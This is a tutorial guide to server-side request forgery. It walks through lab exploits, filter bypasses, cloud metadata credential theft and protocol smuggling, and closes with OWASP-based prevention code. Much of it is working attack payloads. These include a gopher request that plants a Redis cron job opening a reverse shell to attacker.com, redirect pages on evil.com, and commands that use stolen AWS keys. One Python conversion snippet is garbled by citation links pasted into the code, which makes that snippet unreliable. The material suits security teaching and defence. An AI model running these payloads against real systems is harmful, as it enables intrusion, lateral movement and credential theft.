# Server-Side Request Forgery (SSRF) - Comprehensive Guide

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows attackers to induce server-side applications to make HTTP requests to unintended locations. By manipulating parameters that specify URLs or network locations, attackers can force the server to interact with internal infrastructure, cloud metadata services, or arbitrary external systems. The severity ranges from information disclosure through accessing internal admin panels to full remote code execution via cloud credential theft. SSRF exploits the implicit trust relationships between servers and internal systems, where requests originating from localhost or internal networks bypass authentication and authorization controls.

The paradigm: **servers trust themselves and their neighbors**—SSRF abuses this trust to pivot from external attacker to internal system access.

## What is SSRF? (fundamentals)

### Core concept: Server as a proxy

**Normal application flow:**
```
User → Application → Database (internal)
```

**SSRF exploitation:**
```
Attacker → Application → Internal Admin Panel (bypassed auth)
Attacker → Application → Cloud Metadata Service (steal credentials)
Attacker → Application → Other Internal Systems (lateral movement)
```

**The vulnerability:** Application accepts user-controlled URLs and makes requests to them without proper validation.

### Classic SSRF example

**Vulnerable feature:** Check stock availability

**Normal request:**
```http
POST /product/stock HTTP/1.1
Host: shop.example.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

**Server behavior:**
```python
def check_stock(stock_api_url):
    # Server makes request to user-supplied URL
    response = requests.get(stock_api_url)
    return response.text
```

**SSRF exploitation:**
```http
POST /product/stock HTTP/1.1
Host: shop.example.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

**Result:** Server fetches its own admin panel and returns content to attacker.

### Trust relationships that enable SSRF

**Trust 1: Localhost privilege**
```
External request to /admin:
User → Application → /admin → 403 Forbidden (requires auth)

Request from localhost:
Application → localhost/admin → 200 OK (trusted, no auth!)
```

**Trust 2: Internal network access**
```
External access:
Internet → Firewall → BLOCKED (192.168.x.x not routable)

SSRF access:
Attacker → Application → Internal Network (192.168.x.x) → SUCCESS
```

**Trust 3: Cloud metadata services**
```
Direct access from internet:
Attacker → http://169.254.169.254/latest/meta-data → BLOCKED (not routable)

SSRF access:
Attacker → Application → http://169.254.169.254/latest/meta-data → AWS credentials!
```

### Impact categories

**Critical - Cloud credential theft:**
```
Access AWS metadata:
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

Returns:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}

Result: Full AWS account access
```

**High - Internal system access:**
```
Access internal admin panel:
http://localhost/admin

Access internal services:
http://192.168.1.100/admin
http://internal-api.local/sensitive-data

Result: Bypass authentication, access sensitive functionality
```

**High - Port scanning and service discovery:**
```
Scan internal network:
http://192.168.1.1:22 → SSH
http://192.168.1.1:3306 → MySQL
http://192.168.1.1:6379 → Redis

Result: Map internal infrastructure
```

**Medium - Information disclosure:**
```
Read local files (via file:// protocol):
file:///etc/passwd
file:///var/www/html/config.php

Result: Leak credentials, source code
```

**Medium - Denial of Service:**
```
Infinite redirect loop
Large file downloads consuming resources
```

## Types of SSRF attacks

### Type 1: SSRF against the server itself (localhost)

**Attack pattern:** Force server to make requests to itself via loopback interface.

#### Example: Accessing local admin panel

**Vulnerable code:**
```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch-url', methods=['POST'])
def fetch_url():
    url = request.form['url']
    
    # NO VALIDATION!
    response = requests.get(url)
    
    return response.text
```

**Normal usage:**
```http
POST /fetch-url HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://api.example.com/data
```

**SSRF exploitation:**
```http
POST /fetch-url HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://localhost/admin
```

**Why it works:**
- Admin panel accessible from localhost without authentication
- Access control assumes "localhost = trusted admin"
- Application makes request as localhost → bypasses authentication

#### Lab walkthrough: Basic SSRF against the local server

**Scenario:** E-commerce app with stock checker, admin panel at /admin accessible only from localhost.

**Step 1: Identify SSRF vector**
```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

**Step 2: Test localhost access**
```http
POST /product/stock HTTP/1.1

stockApi=http://localhost/admin
```

**Response:**
```html
<h1>Admin Panel</h1>
<a href="/admin/delete?username=carlos">Delete user carlos</a>
```

**Step 3: Delete user**
```http
POST /product/stock HTTP/1.1

stockApi=http://localhost/admin/delete?username=carlos
```

**Result:** User deleted via SSRF!

#### Common localhost variations

```
Loopback addresses:
http://127.0.0.1/admin
http://localhost/admin
http://0.0.0.0/admin
http://0/admin

IPv6 loopback:
http://[::1]/admin
http://[0000:0000:0000:0000:0000:0000:0000:0001]/admin

Alternative ports:
http://localhost:8080/admin
http://localhost:9090/admin
```

### Type 2: SSRF against backend systems

**Attack pattern:** Access internal network systems not directly reachable from internet.

#### Network topology

```
Internet
   ↓
Firewall (blocks 192.168.x.x)
   ↓
Web Application (public: 203.0.113.10)
   ↓
Internal Network:
   ├── Admin Panel (192.168.0.68)
   ├── Database (192.168.0.100)
   └── Internal API (192.168.0.200)
```

**Direct access blocked:**
```bash
# From attacker's machine
curl http://192.168.0.68/admin
# Error: Network unreachable (private IP)
```

**SSRF access succeeds:**
```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.68/admin
```

**Result:** Application acts as proxy to internal network!

#### Lab walkthrough: Basic SSRF against backend system

**Scenario:** Admin interface at 192.168.0.X on port 8080 (unknown exact IP).

**Step 1: Scan internal network**

Using Burp Intruder:
```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.§1§:8080/admin
```

**Intruder payload:** Numbers 1-255

**Step 2: Identify valid IP**
```
192.168.0.1:8080 → Connection timeout
192.168.0.2:8080 → Connection timeout
...
192.168.0.68:8080 → 200 OK (Admin panel found!)
```

**Step 3: Access admin functionality**
```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.68:8080/admin
```

**Response:**
```html
<a href="/admin/delete?username=carlos">Delete carlos</a>
```

**Step 4: Exploit**
```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
```

#### Internal service discovery

**Common internal services to target:**

```
Admin panels:
http://192.168.0.1/admin
http://192.168.1.1/manager
http://10.0.0.1/dashboard

Databases:
http://192.168.0.100:3306 (MySQL)
http://192.168.0.100:5432 (PostgreSQL)
http://192.168.0.100:27017 (MongoDB)

Caching:
http://192.168.0.200:6379 (Redis)
http://192.168.0.200:11211 (Memcached)

Internal APIs:
http://internal-api.local/
http://192.168.0.50:8000/api/

Cloud metadata:
http://169.254.169.254/ (AWS)
http://metadata.google.internal/ (GCP)
http://169.254.169.254/metadata/instance (Azure)
```

### Type 3: Blind SSRF

**Characteristic:** Application makes request but doesn't return response to attacker.

**Vulnerable code:**
```python
@app.route('/report-issue', methods=['POST'])
def report_issue():
    issue_url = request.form['url']
    
    # Make request but don't return response
    try:
        requests.get(issue_url, timeout=5)
        log_analytics(issue_url)  # Log for internal review
    except:
        pass
    
    return "Thank you for reporting!"
```

**Challenge:** Can't see response, harder to exploit.

#### Exploitation technique 1: Out-of-band detection

**Use Burp Collaborator or similar:**
```http
POST /report-issue HTTP/1.1

url=http://attacker.burpcollaborator.net
```

**Burp Collaborator receives:**
```
DNS lookup for attacker.burpcollaborator.net
HTTP GET request to attacker.burpcollaborator.net
Source IP: 203.0.113.10 (target server)
User-Agent: python-requests/2.25.1
```

**Confirmation:** SSRF exists!

#### Exploitation technique 2: Time-based detection

**Test internal service existence:**
```http
POST /report-issue HTTP/1.1

url=http://192.168.0.100:3306
```

**Timing analysis:**
```
Open port (MySQL running):
Request completes in: 0.1 seconds (connection accepted)

Closed port:
Request completes in: 75 seconds (connection timeout)

Filtered port:
Request completes in: 5 seconds (immediate rejection)
```

#### Exploitation technique 3: Side-channel via Referer

**Scenario:** Analytics software fetches URLs from Referer header.

**Vulnerable code:**
```python
@app.route('/analytics')
def analytics():
    referer = request.headers.get('Referer')
    
    # Fetch referring site for analytics
    if referer:
        response = requests.get(referer)
        parse_analytics(response.text)
```

**Exploitation:**
```http
GET /analytics HTTP/1.1
Host: target.com
Referer: http://192.168.0.68/admin
```

**Result:** Server fetches internal admin panel, even though response not returned to attacker.

**Advanced: Exfiltrate via Referer chain**
```
1. Attacker controls evil.com
2. SSRF to internal service with redirect to evil.com:
   url=http://192.168.0.68/admin-data

3. If analytics follows Referer on evil.com:
   Server → 192.168.0.68/admin-data → 200 OK
   Server → evil.com (logs Referer: http://192.168.0.68/admin-data)
   
4. evil.com logs contain internal data in Referer!
```

## Bypassing SSRF defenses

### Defense 1: Blacklist-based filters

**Blocked inputs:**
```python
blacklist = ['127.0.0.1', 'localhost', '192.168', '10.0', 'admin']

def is_blocked(url):
    for blocked in blacklist:
        if blocked in url:
            return True
    return False
```

### Bypass technique 1: Alternative IP representations

**Decimal representation:**
```
127.0.0.1 in decimal: 2130706433

Exploit:
stockApi=http://2130706433/admin
```

**Calculation:**
```python
def ip_to_decimal(ip):
    parts = ip.split('.')
    return (int(parts[0]) << 24) + (int(parts [portswigger](https://portswigger.net/web-security/ssrf)) << 16) + \
           (int(parts [portswigger](https://portswigger.net/web-security/learning-paths/ssrf-attacks)) << 8) + int(parts [youtube](https://www.youtube.com/watch?v=PdVGk5NlnTY))

print(ip_to_decimal('127.0.0.1'))  # 2130706433
print(ip_to_decimal('192.168.0.1'))  # 3232235521
```

**Octal representation:**
```
127.0.0.1 in octal: 017700000001 or 0177.0.0.1

Exploit:
stockApi=http://017700000001/admin
stockApi=http://0177.0.0.1/admin
```

**Hexadecimal representation:**
```
127.0.0.1 in hex: 0x7f000001 or 0x7f.0.0.1

Exploit:
stockApi=http://0x7f000001/admin
```

**Shortened IP formats:**
```
127.0.0.1 = 127.1 (omit zeros)
192.168.0.1 = 192.168.1 (omit middle zeros)

Exploit:
stockApi=http://127.1/admin
```

**IPv6 representations:**
```
::1 (IPv6 loopback)
::ffff:127.0.0.1 (IPv4-mapped IPv6)
0:0:0:0:0:ffff:7f00:0001

Exploit:
stockApi=http://[::1]/admin
stockApi=http://[::ffff:127.0.0.1]/admin
```

### Bypass technique 2: DNS rebinding

**Register domain pointing to localhost:**
```
attacker.com → 127.0.0.1

Exploit:
stockApi=http://attacker.com/admin
```

**Burp Collaborator provides this:**
```
spoofed.burpcollaborator.net → 127.0.0.1
```

### Bypass technique 3: URL encoding

**Simple encoding:**
```
localhost → lo%63alhost → lo%63%61lhost
127.0.0.1 → 127%2e0%2e0%2e1

Exploit:
stockApi=http://lo%63alhost/admin
stockApi=http://127%2e0%2e0%2e1/admin
```

**Double encoding:**
```
. (dot) = %2e
%2e encoded again = %252e

Exploit:
stockApi=http://127%252e0%252e0%252e1/admin
```

**Works if:** Server decodes twice or filter decodes once, backend decodes again.

### Bypass technique 4: Case variation

```
Blocked: localhost, LOCALHOST

Bypass:
stockApi=http://LocalHost/admin
stockApi=http://lOcAlHoSt/admin
```

### Bypass technique 5: Redirect-based bypass

**Setup attacker-controlled redirect:**
```php
// evil.com/redirect.php
<?php
header("Location: http://127.0.0.1/admin");
?>
```

**Exploit:**
```http
POST /product/stock HTTP/1.1

stockApi=http://evil.com/redirect.php
```

**Server behavior:**
```
1. Checks URL: evil.com ✓ (not blacklisted)
2. Makes request to evil.com
3. Receives 302 redirect to http://127.0.0.1/admin
4. Follows redirect (if redirects enabled)
5. Accesses localhost/admin
```

**Protocol switching bypass:**
```
Redirect from: http://evil.com
Redirect to: https://127.0.0.1/admin

Some filters check HTTP but not HTTPS!
```

#### Lab: SSRF with blacklist-based input filter

**Scenario:** Application blocks "127.0.0.1", "localhost", and "/admin".

**Attempt 1: Direct localhost**
```http
stockApi=http://localhost/admin
Response: "Blocked: localhost detected"
```

**Attempt 2: Use 127.1**
```http
stockApi=http://127.1/admin
Response: "Blocked: admin detected"
```

**Attempt 3: URL encode "admin"**
```http
stockApi=http://127.1/%61dmin
Response: 200 OK (bypassed!)
```

**Explanation:**
- `%61` = 'a'
- Filter checks for string "/admin"
- After decoding: "/%61dmin" becomes "/admin"
- Filter bypassed!

### Defense 2: Whitelist-based filters

**Allowed domains:**
```python
whitelist = ['stock.weliketoshop.net', 'api.trusted.com']

def is_allowed(url):
    for allowed in whitelist:
        if allowed in url:
            return True
    return False
```

### Bypass technique 1: @ credential injection

**URL format:**
```
https://username:password@hostname/path
```

**Exploit:**
```
stockApi=http://trusted.com@evil.com/

Parser sees: trusted.com (passes whitelist)
Request goes to: evil.com (actual hostname after @)
```

**Detailed parsing:**
```
URL: http://expected-host:fakepassword@evil-host
     └─ Credentials ──────────────┘└─ Actual host

Naive parser: Sees "expected-host" → Allows
Real parser: Connects to "evil-host"
```

### Bypass technique 2: # fragment injection

**Exploit:**
```
stockApi=http://evil.com#trusted.com

Parser sees: trusted.com (in fragment, passes check)
Request goes to: evil.com (hostname before #)
```

**URL structure:**
```
http://evil.com#trusted.com
└─ Host ──┘└─ Fragment

Fragment ignored in actual request!
```

### Bypass technique 3: Subdomain control

**Register subdomain:**
```
trusted-host.evil.com

DNS:
trusted-host.evil.com → attacker's IP
```

**Exploit:**
```
stockApi=http://trusted-host.evil.com/payload

Parser sees: "trusted-host" (passes whitelist check for "trusted-host")
Request goes to: attacker's server
```

### Bypass technique 4: Open redirect chaining

**Scenario:** Trusted domain has open redirect vulnerability.

**Open redirect on trusted site:**
```
http://trusted.com/redirect?url=http://evil.com
→ Redirects to http://evil.com
```

**SSRF exploitation:**
```http
stockApi=http://trusted.com/redirect?url=http://192.168.0.68/admin
```

**Execution flow:**
```
1. Whitelist check: trusted.com ✓
2. Request to: http://trusted.com/redirect?url=...
3. Redirect to: http://192.168.0.68/admin
4. Access internal admin panel!
```

#### Lab: SSRF with whitelist-based input filter

**Scenario:** Only "stock.weliketoshop.net" allowed.

**Attempt 1: @ bypass**
```http
stockApi=http://stock.weliketoshop.net@localhost/admin
Response: "Invalid URL"
```

**Attempt 2: # fragment**
```http
stockApi=http://localhost%23@stock.weliketoshop.net/admin
Response: "Invalid URL"
```

**Attempt 3: Double URL encoding**
```http
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
Response: 200 OK

Explanation:
%25 = % (URL encoded)
%2523 = %23 (double encoded #)
After decoding: localhost#@stock.weliketoshop.net
Parser confusion → bypassed!
```

### Bypass technique 5: Open redirect on allowed domain

#### Lab: SSRF with filter bypass via open redirection

**Scenario:** Only "weliketoshop.net" URLs allowed. Site has open redirect.

**Discovery: Open redirect**
```http
GET /product/nextProduct?currentProductId=1&path=http://evil.com

Response:
HTTP/1.1 302 Found
Location: http://evil.com
```

**Exploitation:**
```http
POST /product/stock HTTP/1.1

stockApi=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin
```

**Flow:**
```
1. Whitelist check: weliketoshop.net ✓
2. Request to: weliketoshop.net/product/nextProduct?path=...
3. 302 redirect to: http://192.168.0.68/admin
4. Follow redirect → Internal admin access!
```

## Advanced SSRF exploitation

### Cloud metadata service attacks

#### AWS metadata service (IMDSv1)

**Endpoint:**
```
http://169.254.169.254/latest/meta-data/
```

**Critical paths:**
```
IAM credentials:
http://169.254.169.254/latest/meta-data/iam/security-credentials/

Instance identity:
http://169.254.169.254/latest/meta-data/instance-id

User data (may contain secrets):
http://169.254.169.254/latest/user-data
```

**Exploitation:**
```http
POST /fetch-url HTTP/1.1

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Response:**
```
admin-role
```

**Fetch credentials:**
```http
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

**Response:**
```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-02-19T00:00:00Z"
}
```

**Use stolen credentials:**
```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws s3 ls  # List all S3 buckets
aws ec2 describe-instances  # List EC2 instances
```

#### AWS IMDSv2 (requires token)

**Protection:** Requires PUT request to get token (SSRF usually only allows GET).

**Bypass:** Some SSRF vulnerabilities allow arbitrary HTTP methods.

**Exploit if PUT allowed:**
```
Step 1: Get token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

Response: AQAAAxxxxxxx (token)

Step 2: Use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: AQAAAxxxxxxx
```

#### GCP metadata service

**Endpoint:**
```
http://metadata.google.internal/computeMetadata/v1/
```

**Requires header:**
```
Metadata-Flavor: Google
```

**Exploitation (if custom headers allowed):**
```http
POST /fetch-url HTTP/1.1

url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
headers=Metadata-Flavor: Google
```

**Response:**
```json
{
  "access_token": "ya29...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

#### Azure metadata service

**Endpoint:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Requires header:**
```
Metadata: true
```

**Exploitation:**
```http
url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
headers=Metadata: true
```

### Protocol smuggling attacks

**Supported protocols beyond HTTP:**

**File protocol:**
```
file:///etc/passwd
file:///var/www/html/config.php
file:///c:/windows/win.ini
```

**FTP protocol:**
```
ftp://internal-ftp.local/
```

**Gopher protocol (powerful!):**
```
Allows arbitrary TCP packets, can exploit:
- Redis
- Memcached
- SMTP
- MySQL
```

**Gopher example - Redis exploitation:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

Result: Writes cron job for reverse shell
```

**Dict protocol:**
```
dict://127.0.0.1:6379/info
Queries Redis info
```

**LDAP protocol:**
```
ldap://internal-ldap.local:389/dc=example,dc=com
```

### XXE to SSRF

**If application accepts XML:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.0.68/admin">
]>
<data>&xxe;</data>
```

**Application parses XML, triggers SSRF to internal admin panel.**

### PDF generators and SSRF

**Vulnerable: HTML to PDF conversion**

**Exploit:**
```html
<html>
<body>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<iframe src="http://192.168.0.68/admin"></iframe>
</body>
</html>
```

**PDF generator renders HTML → Fetches images/iframes → SSRF!**

## Hidden attack surfaces

### Partial URL injection

**Scenario:** Application only accepts hostname, constructs full URL server-side.

**Vulnerable code:**
```python
def fetch_api_data(hostname):
    # Application constructs URL
    url = f"https://{hostname}/api/data"
    return requests.get(url).text
```

**Limited exploitation:**
```
hostname=192.168.0.68

Server requests: https://192.168.0.68/api/data
Can't control path or protocol
```

**Bypass with @ symbol:**
```
hostname=evil.com@192.168.0.68

Server requests: https://evil.com@192.168.0.68/api/data
Connects to: 192.168.0.68 (after @)
```

### Referer header SSRF

**Vulnerable: Analytics tracking**

**Vulnerable code:**
```python
@app.route('/page')
def page():
    referer = request.headers.get('Referer')
    
    # Fetch referring page for analytics
    if referer:
        analytics_service.fetch_url(referer)
    
    return render_template('page.html')
```

**Exploitation:**
```http
GET /page HTTP/1.1
Host: target.com
Referer: http://192.168.0.68/admin
```

**Result:** Server fetches internal admin panel for analytics.

### HTML meta refresh

**Scenario:** Application allows HTML content, renders in browser or PDF.

```html
<meta http-equiv="refresh" content="0; url=http://192.168.0.68/admin">
```

**If server-side rendering occurs, triggers SSRF.**

### Import/Export functionality

**CSV import with external resources:**
```csv
Name,Avatar
John,http://192.168.0.68/admin
```

**If application fetches avatar URLs → SSRF**

**Excel import with external entities:**
```xml
<!-- Excel XML with external entity -->
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://192.168.0.68/admin"> ]>
<row>&xxe;</row>
```

### Webhook/Callback URLs

**Common in:**
- Payment gateways (callback after payment)
- OAuth applications (redirect_uri)
- API integrations (webhook URLs)

**Example: OAuth redirect_uri**
```http
GET /oauth/authorize?redirect_uri=http://192.168.0.68/admin&client_id=abc

Server validates client_id, then redirects to redirect_uri
SSRF to internal admin!
```

## Prevention strategies (from OWASP)

### Defense Layer 1: Input validation (whitelist approach)

**For known destinations only:**

**Validate IP addresses:**
```python
import ipaddress

def is_valid_public_ip(ip_string):
    try:
        ip = ipaddress.ip_address(ip_string)
        
        # Reject private IPs
        if ip.is_private:
            return False
        
        # Reject loopback
        if ip.is_loopback:
            return False
        
        # Reject link-local
        if ip.is_link_local:
            return False
        
        # Reject multicast
        if ip.is_multicast:
            return False
        
        # Must be public
        return ip.is_global
        
    except ValueError:
        return False

# Usage
if not is_valid_public_ip(user_ip):
    raise ValueError("Private IP addresses not allowed")
```

**Validate domain names:**
```python
import re

def is_valid_domain(domain):
    # Regex for valid domain name
    pattern = r'^(((?!-))(xn--|_)?[a-z0-9-]{0,61}[a-z0-9]\.)*([a-z0-9][a-z0-9\-]{0,60}|[a-z0-9-]{1,30}\.[a-z]{2,})$'
    
    if not re.match(pattern, domain.lower()):
        return False
    
    # Additional checks
    if domain.startswith('.') or domain.endswith('.'):
        return False
    
    return True
```

**Whitelist specific domains:**
```python
ALLOWED_DOMAINS = [
    'api.trusted.com',
    'api.partner.com'
]

def is_allowed_domain(url):
    from urllib.parse import urlparse
    
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    return hostname in ALLOWED_DOMAINS
```

### Defense Layer 2: Network layer controls

**Firewall rules:**
```
Application server (10.0.1.5):
- Allow outbound to: api.trusted.com (203.0.113.10)
- Allow outbound to: api.partner.com (203.0.113.20)
- Deny outbound to: 10.0.0.0/8 (internal network)
- Deny outbound to: 192.168.0.0/16 (private network)
- Deny outbound to: 127.0.0.0/8 (loopback)
- Deny outbound to: 169.254.169.254/32 (metadata service)
```

**Network segregation:**
```
DMZ (Demilitarized Zone):
- Web application servers
- Can only reach specific external APIs
- Cannot reach internal network

Internal Network:
- Admin panels
- Databases
- Not accessible from DMZ
```

### Defense Layer 3: Disable redirects

```python
import requests

# Disable automatic redirects
response = requests.get(user_url, allow_redirects=False)

# Check for redirect manually
if response.status_code in [301, 302, 303, 307, 308]:
    raise ValueError("Redirects not allowed")
```

### Defense Layer 4: Disable dangerous protocols

```python
from urllib.parse import urlparse

ALLOWED_PROTOCOLS = ['http', 'https']

def validate_url(url):
    parsed = urlparse(url)
    
    if parsed.scheme not in ALLOWED_PROTOCOLS:
        raise ValueError(f"Protocol {parsed.scheme} not allowed")
    
    return True

# Blocks: file://, gopher://, ftp://, dict://
```

### Defense Layer 5: Response handling

**Don't return raw responses:**
```python
# BAD - Returns raw response
def fetch_url(url):
    response = requests.get(url)
    return response.text  # Might leak internal data

# GOOD - Process and sanitize
def fetch_url_safe(url):
    response = requests.get(url)
    
    # Extract only needed data
    data = json.loads(response.text)
    return {
        'status': data.get('status'),
        'message': data.get('message')
    }
    # Doesn't return raw internal responses
```

### Defense Layer 6: Use allowlist with authentication

**Whitelist approach with token validation:**

```python
import secrets

# Generate token for legitimate request
def generate_callback_token():
    return secrets.token_urlsafe(32)

# Store expected callback
def register_callback(url, token):
    redis.setex(f"callback:{token}", 3600, url)

# Validate callback
def validate_callback(url, token):
    expected_url = redis.get(f"callback:{token}")
    
    if expected_url is None:
        return False
    
    if expected_url != url:
        return False
    
    return True

# Usage:
# 1. User requests webhook: GET /register-webhook?url=https://user.com/webhook
# 2. Server generates token, returns to user
# 3. When server makes callback, includes token: POST https://user.com/webhook?token=abc123
# 4. Receiving service can verify token matches registered URL
```

### Defense Layer 7: DNS validation

**Resolve and validate IP:**
```python
import socket
import ipaddress

def is_safe_url(url):
    from urllib.parse import urlparse
    
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    try:
        # Resolve domain to IP
        ip_string = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(ip_string)
        
        # Check if resolves to private IP
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
        
        # Additional check: Resolve again to prevent DNS rebinding
        # (Check multiple times with delay)
        time.sleep(1)
        ip_string2 = socket.gethostbyname(hostname)
        
        if ip_string != ip_string2:
            return False  # DNS rebinding attack detected
        
        return True
        
    except socket.gaierror:
        return False
```

**Monitor allowlisted domains:**
```python
# Check that allowed domains don't resolve to private IPs
import dns.resolver

def monitor_allowed_domains():
    for domain in ALLOWED_DOMAINS:
        try:
            answers = dns.resolver.resolve(domain, 'A')
            
            for rdata in answers:
                ip = ipaddress.ip_address(rdata.to_text())
                
                if not ip.is_global:
                    alert(f"SECURITY: {domain} resolves to private IP {ip}")
        except:
            pass
```

### Complete secure implementation

```python
import requests
import ipaddress
import socket
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.trusted.com']
ALLOWED_PROTOCOLS = ['http', 'https']
TIMEOUT = 5

def fetch_external_url(url):
    """
    Secure URL fetching with comprehensive SSRF protection
    """
    
    # Step 1: Parse URL
    try:
        parsed = urlparse(url)
    except Exception as e:
        raise ValueError(f"Invalid URL: {e}")
    
    # Step 2: Validate protocol
    if parsed.scheme not in ALLOWED_PROTOCOLS:
        raise ValueError(f"Protocol not allowed: {parsed.scheme}")
    
    # Step 3: Validate domain against whitelist
    hostname = parsed.hostname
    if hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {hostname}")
    
    # Step 4: Resolve domain to IP
    try:
        ip_string = socket.gethostbyname(hostname)
    except socket.gaierror:
        raise ValueError(f"Cannot resolve domain: {hostname}")
    
    # Step 5: Validate IP is public
    try:
        ip = ipaddress.ip_address(ip_string)
        
        if ip.is_private:
            raise ValueError("Domain resolves to private IP")
        
        if ip.is_loopback:
            raise ValueError("Domain resolves to loopback")
        
        if ip.is_link_local:
            raise ValueError("Domain resolves to link-local IP")
        
        if not ip.is_global:
            raise ValueError("Domain does not resolve to public IP")
            
    except ValueError as e:
        raise ValueError(f"IP validation failed: {e}")
    
    # Step 6: Make request with safety controls
    try:
        response = requests.get(
            url,
            timeout=TIMEOUT,
            allow_redirects=False,  # Disable redirects
            headers={'User-Agent': 'InternalApp/1.0'}
        )
    except requests.RequestException as e:
        raise ValueError(f"Request failed: {e}")
    
    # Step 7: Check for redirects
    if response.status_code in [301, 302, 303, 307, 308]:
        raise ValueError("Redirects not allowed")
    
    # Step 8: Don't return raw response
    # Extract only necessary data
    if response.status_code == 200:
        return {
            'status': 'success',
            'data': response.json()  # Assume JSON response
        }
    else:
        return {
            'status': 'error',
            'code': response.status_code
        }
```
